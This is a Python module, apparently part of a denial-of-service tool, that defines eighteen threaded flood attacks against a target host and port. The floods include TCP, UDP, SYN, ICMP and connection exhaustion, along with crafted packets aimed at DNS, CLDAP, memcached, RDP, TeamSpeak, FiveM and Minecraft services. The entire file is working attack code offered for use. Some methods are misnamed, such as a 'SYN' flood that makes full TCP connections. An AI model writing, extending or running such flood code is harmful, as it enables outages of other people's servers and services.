# methods/layer4.py

import socket
import threading
import random
import struct
import time

def run_layer4_attack(args):
    method = args.method.upper()
    end_time = time.time() + args.duration

    def tcp_flood():
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((args.target, args.port))
                s.send(b"A" * 1024)
                s.close()
            except:
                continue

    def udp_flood():
        data = random._urandom(1024)
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(data, (args.target, args.port))
            except:
                continue

    def syn_flood():
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((args.target, args.port))
                s.close()
            except:
                continue

    def icmp_flood():
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                packet = b'\x08\x00\x7d\x4b\x00\x01\x00\x01'
                s.sendto(packet, (args.target, 1))
            except:
                continue

    def cps_flood():
        while time.time() < end_time:
            try:
                s = socket.socket()
                s.connect((args.target, args.port))
                s.close()
            except:
                continue

    def connection_flood():
        while time.time() < end_time:
            try:
                s = socket.socket()
                s.connect((args.target, args.port))
                time.sleep(10)  # keep alive
            except:
                continue

    def vse_flood():
        payload = b'\xFF\xFF\xFF\xFF\x54Source Engine Query\x00'
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (args.target, args.port))
            except:
                continue

    def ts3_flood():
        payload = b"\x02"
        while time.time() < end_time:
            try:
                s = socket.socket()
                s.connect((args.target, args.port))
                s.send(payload)
                s.close()
            except:
                continue

    def fivem_flood():
        payload = b"\xFF\xFF\xFF\xFFgetinfo xyz"
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (args.target, args.port))
            except:
                continue

    def mem_flood():
        payload = b"stats\r\n"
        while time.time() < end_time:
            try:
                s = socket.socket()
                s.connect((args.target, args.port))
                s.send(payload)
                s.close()
            except:
                continue

    def dns_flood():
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                packet = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01"
                s.sendto(packet, (args.target, args.port))
            except:
                continue

    def chargen_flood():
        payload = b"A" * 512
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (args.target, args.port))
            except:
                continue

    def cldap_flood():
        payload = b"\x30\x84\x00\x00\x00\x1f\x02\x01\x01\x63\x84\x00\x00\x00\x16\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00"
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (args.target, args.port))
            except:
                continue

    def ard_flood():
        payload = b"ARD"
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (args.target, args.port))
            except:
                continue

    def rdp_flood():
        payload = b"\x03\x00\x00\x13\x0e\xd0\x00\x00\x12\x34\x00\x02\x00\x08\x00\x03\x00\x00\x00"
        while time.time() < end_time:
            try:
                s = socket.socket()
                s.connect((args.target, args.port))
                s.send(payload)
                s.close()
            except:
                continue

    def mcpe_flood():
        payload = b"\x01\x00\x00\x00\x00\x00\x00\x00"
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (args.target, args.port))
            except:
                continue

    def mc_flood():
        payload = b"\xFE\x01"
        while time.time() < end_time:
            try:
                s = socket.socket()
                s.connect((args.target, args.port))
                s.send(payload)
                s.close()
            except:
                continue

    def mcbot_flood():
        while time.time() < end_time:
            try:
                s = socket.socket()
                s.connect((args.target, args.port))
                s.send(b"\x00")
                s.close()
            except:
                continue

    # Map method names to functions
    method_map = {
        "TCP": tcp_flood,
        "UDP": udp_flood,
        "SYN": syn_flood,
        "ICMP": icmp_flood,
        "CPS": cps_flood,
        "CONNECTION": connection_flood,
        "VSE": vse_flood,
        "TS3": ts3_flood,
        "FIVEM": fivem_flood,
        "MEM": mem_flood,
        "DNS": dns_flood,
        "CHAR": chargen_flood,
        "CLDAP": cldap_flood,
        "ARD": ard_flood,
        "RDP": rdp_flood,
        "MCPE": mcpe_flood,
        "MINECRAFT": mc_flood,
        "MCBOT": mcbot_flood,
    }

    if method not in method_map:
        print(f"[!] Layer 4 method '{method}' is not supported.")
        return

    print(f"[+] Starting Layer 4 method: {method} with {args.threads} threads...")

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=method_map[method])
        t.start()
        threads.append(t)

    for t in threads:
        t.join()
